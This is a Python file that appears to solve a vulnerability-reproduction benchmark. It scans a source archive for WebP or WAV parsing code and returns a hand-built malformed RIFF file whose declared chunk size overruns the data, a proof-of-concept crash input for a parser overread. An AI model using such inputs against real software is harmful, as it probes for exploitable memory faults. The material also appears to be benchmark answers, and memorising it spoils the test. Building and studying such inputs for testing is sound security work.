import os
import io
import tarfile
import zipfile
import struct
from typing import Optional, Tuple


def _le32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _le16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _make_wav_poc() -> bytes:
    # 58 bytes total
    # RIFF size correct (len-8), but data chunk size exceeds remaining bytes.
    poc = bytearray()
    poc += b"RIFF" + _le32(50) + b"WAVE"
    poc += b"fmt " + _le32(16)
    poc += _le16(1)          # PCM
    poc += _le16(1)          # channels
    poc += _le32(8000)       # sample rate
    poc += _le32(8000)       # byte rate
    poc += _le16(1)          # block align
    poc += _le16(8)          # bits per sample
    poc += b"data" + _le32(32)
    poc += b"\x00" * 14
    return bytes(poc)


def _make_webp_poc() -> bytes:
    # 58 bytes total
    # RIFF size correct (len-8), but VP8 chunk declares size beyond RIFF end.
    poc = bytearray()
    poc += b"RIFF" + _le32(50) + b"WEBP"
    poc += b"VP8X" + _le32(10) + (b"\x00" * 10)
    # Declares 32 bytes but only 20 bytes provided -> extends past RIFF end.
    vp8_payload = b"\x00\x00\x00\x9d\x01\x2a\x01\x00\x01\x00" + (b"\x00" * 10)  # 20 bytes
    poc += b"VP8 " + _le32(32) + vp8_payload
    return bytes(poc)


def _score_sources_from_bytes(data: bytes, name_l: str) -> Tuple[int, int]:
    dl = data.lower()
    webp_score = 0
    wav_score = 0
    avi_score = 0

    if "webp" in name_l:
        webp_score += 7
    if "vp8" in name_l or "vp8x" in name_l:
        webp_score += 4
    if "wav" in name_l or name_l.endswith(".wav"):
        wav_score += 7
    if "wave" in name_l:
        wav_score += 3
    if "riff" in name_l:
        wav_score += 1
        webp_score += 1
        avi_score += 1
    if "avi" in name_l:
        avi_score += 6

    # Strong indicators
    if b"webpdecode" in dl or b"webpdemux" in dl or b"webpmux" in dl:
        webp_score += 20
    if b"vp8x" in dl or b"vp8 " in dl or b"vp8l" in dl or b"webp" in dl:
        webp_score += 8

    if b"wave" in dl and b"fmt " in dl and b"data" in dl:
        wav_score += 14
    if b".wav" in dl or b"wav" in dl:
        wav_score += 4

    if b"llvmfuzzertestoneinput" in dl:
        if b"webp" in dl or b"vp8" in dl:
            webp_score += 12
        if b"wave" in dl or b"fmt " in dl:
            wav_score += 12
        if b"avi" in dl:
            avi_score += 8

    # Avoid choosing wav just because of generic word "wave" unrelated to RIFF/WAV parsing
    if b"wav" not in dl and b"fmt " not in dl and b"data" not in dl and b"wave" in dl:
        wav_score -= 2

    return webp_score, wav_score


def _scan_path(src_path: str, max_files: int = 1500, max_read: int = 200_000) -> Tuple[int, int]:
    webp_score = 0
    wav_score = 0
    files_scanned = 0

    for root, _, files in os.walk(src_path):
        for fn in files:
            files_scanned += 1
            if files_scanned > max_files:
                return webp_score, wav_score
            name_l = fn.lower()
            if not (name_l.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".py", ".rs", ".java", ".go", ".swift")) or
                    ("fuzz" in name_l) or ("test" in name_l) or ("demux" in name_l) or ("decode" in name_l) or ("riff" in name_l) or
                    ("webp" in name_l) or ("wav" in name_l) or ("wave" in name_l)):
                continue
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
                if st.st_size <= 0:
                    continue
                with open(path, "rb") as f:
                    data = f.read(min(st.st_size, max_read))
            except OSError:
                continue

            w1, w2 = _score_sources_from_bytes(data, name_l)
            webp_score += w1
            wav_score += w2

            # Early exit if confident
            if webp_score >= wav_score + 35:
                return webp_score, wav_score
            if wav_score >= webp_score + 35:
                return webp_score, wav_score

    return webp_score, wav_score


def _scan_tar(src_path: str, max_members: int = 2500, max_read: int = 200_000) -> Tuple[int, int]:
    webp_score = 0
    wav_score = 0
    members_scanned = 0

    try:
        tf = tarfile.open(src_path, "r:*")
    except tarfile.TarError:
        return 0, 0

    with tf:
        for m in tf:
            members_scanned += 1
            if members_scanned > max_members:
                break
            if not m.isfile():
                continue
            name_l = (m.name or "").lower()
            if not (name_l.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".py", ".rs", ".java", ".go", ".swift")) or
                    ("fuzz" in name_l) or ("test" in name_l) or ("demux" in name_l) or ("decode" in name_l) or ("riff" in name_l) or
                    ("webp" in name_l) or ("wav" in name_l) or ("wave" in name_l)):
                continue
            if m.size <= 0:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read(min(m.size, max_read))
            except Exception:
                continue

            w1, w2 = _score_sources_from_bytes(data, name_l)
            webp_score += w1
            wav_score += w2

            if webp_score >= wav_score + 35:
                break
            if wav_score >= webp_score + 35:
                break

    return webp_score, wav_score


def _scan_zip(src_path: str, max_members: int = 3500, max_read: int = 200_000) -> Tuple[int, int]:
    webp_score = 0
    wav_score = 0
    members_scanned = 0
    try:
        zf = zipfile.ZipFile(src_path, "r")
    except Exception:
        return 0, 0
    with zf:
        for info in zf.infolist():
            members_scanned += 1
            if members_scanned > max_members:
                break
            if info.is_dir():
                continue
            name_l = (info.filename or "").lower()
            if not (name_l.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".py", ".rs", ".java", ".go", ".swift")) or
                    ("fuzz" in name_l) or ("test" in name_l) or ("demux" in name_l) or ("decode" in name_l) or ("riff" in name_l) or
                    ("webp" in name_l) or ("wav" in name_l) or ("wave" in name_l)):
                continue
            try:
                with zf.open(info, "r") as f:
                    data = f.read(min(info.file_size, max_read))
            except Exception:
                continue

            w1, w2 = _score_sources_from_bytes(data, name_l)
            webp_score += w1
            wav_score += w2

            if webp_score >= wav_score + 35:
                break
            if wav_score >= webp_score + 35:
                break
    return webp_score, wav_score


class Solution:
    def solve(self, src_path: str) -> bytes:
        webp_score = 0
        wav_score = 0

        if src_path and os.path.isdir(src_path):
            webp_score, wav_score = _scan_path(src_path)
        else:
            p = (src_path or "").lower()
            if p.endswith(".zip"):
                webp_score, wav_score = _scan_zip(src_path)
            else:
                webp_score, wav_score = _scan_tar(src_path)

        # Prefer WEBP when evidence exists, otherwise default to WAV.
        if webp_score > wav_score:
            return _make_webp_poc()
        return _make_wav_poc()